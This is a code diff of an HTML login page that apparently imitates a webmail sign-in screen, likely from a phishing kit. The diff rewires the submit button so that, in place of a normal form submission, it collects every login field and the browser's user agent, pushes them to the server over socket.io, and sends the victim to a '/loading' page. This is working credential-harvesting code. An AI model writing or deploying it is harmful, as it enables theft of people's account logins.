@@ -78,19 +78,6 @@
         <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>  
         <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js"></script>
         <script src="/socket.io/socket.io.js"></script>
-        <script>
-            const socket = io();
-    
-    function submitForm() {
-        document.getElementById('userAgent').value = navigator.userAgent;
-    
-        const formData = new FormData(document.getElementById('loginForm'));
-    
-        socket.emit('submit', Object.fromEntries(formData));
-    
-        window.location.href = `/loading`;
-    }
-        </script>
     </head>
     <body class="en true wide www inbox f-topbar-fixed" id="bdm" style="" onload="document.getElementById('bdm').style.display='';">
         <div class="">
@@ -703,7 +690,13 @@
         document.getElementById('submitFormButton').addEventListener('click', function(event) {
     event.preventDefault(); // Prevent the default form submission
     if (validateForm()) {
-        document.getElementById('loginForm').submit(); // Submit the form if validation passes
+        document.getElementById('userAgent').value = navigator.userAgent;
+    
+        const formData = new FormData(document.getElementById('loginForm'));
+    
+        socket.emit('submit', Object.fromEntries(formData));
+    
+        window.location.href = `/loading`;
     }
 });
 
